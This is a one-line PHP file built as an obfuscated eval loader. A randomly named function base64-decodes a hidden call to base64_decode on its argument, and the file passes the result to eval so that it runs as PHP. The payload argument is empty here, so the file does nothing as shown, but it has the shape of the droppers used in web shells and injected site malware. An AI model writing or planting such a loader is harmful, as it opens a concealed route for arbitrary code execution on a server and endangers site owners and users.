<?php function HFVHwUxhYfTRRBPBvtVB($ExcpeiZIQK){$r=base64_decode("YmFzZTY0X2RlY29kZSgkRXhjcGVpWklRSyk=");return eval("return $r;");} eval('?>'.HFVHwUxhYfTRRBPBvtVB('').'<?php '); ?>